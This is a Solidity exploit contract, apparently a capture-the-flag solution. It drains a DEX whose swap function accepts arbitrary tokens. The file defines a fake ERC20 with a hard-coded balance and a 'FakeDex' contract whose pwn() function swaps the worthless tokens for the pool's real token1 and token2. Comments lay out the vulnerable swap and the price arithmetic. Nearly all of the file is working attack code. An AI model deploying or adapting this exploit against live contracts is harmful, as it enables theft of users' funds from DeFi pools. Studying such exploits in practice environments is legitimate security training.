// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "hardhat/console.sol";

//   function swap(address from, address to, uint amount) public {
//     require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
//     uint swapAmount = getSwapAmount(from, to, amount);
//     IERC20(from).transferFrom(msg.sender, address(this), amount);
//     IERC20(to).approve(address(this), swapAmount);
//     IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
//   }

interface IDex {
    function swap(address from, address to, uint amount) external;

    function getSwapPrice(
        address from,
        address to,
        uint amount
    ) external view returns (uint);

    function approve(address spender, uint amount) external;

    function balanceOf(
        address token,
        address account
    ) external view returns (uint);

    function token1() external view returns (address);

    function token2() external view returns (address);
}

// swap(fakeToken0, token0)
// swap(fakeToken1, token1)
//    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
// amount * to / from = amountOut
// to = amountOut * from / amount

contract FakeToken is ERC20 {
    constructor(address _contract) ERC20("GGB", "GGB") {
        _mint(_contract, 1000);
    }

    function balanceOf(
        address user
    ) public view virtual override returns (uint256) {
        return 100;
    }
}

contract FakeDex {
    IDex targetDex;
    FakeToken fakeToken0;
    FakeToken fakeToken1;
    address token0;
    address token1;
    address player;

    constructor(address _targetDex, address _player) {
        targetDex = IDex(_targetDex);
        fakeToken0 = new FakeToken(address(this));
        fakeToken1 = new FakeToken(address(this));
        token0 = targetDex.token1();
        token1 = targetDex.token2();
    }

    function pwn() external {
        console.logUint(ERC20(token0).balanceOf(address(targetDex)));

        fakeToken0.approve(address(targetDex), type(uint256).max);
        fakeToken1.approve(address(targetDex), type(uint256).max);

        targetDex.swap(address(fakeToken0), token0, 100);

        targetDex.swap(address(fakeToken1), token1, 100);

        require(
            ERC20(token0).balanceOf(address(this)) == 100 &&
                ERC20(token1).balanceOf(address(this)) == 100,
            "Tokens Did Not Get Drained"
        );
    }
}
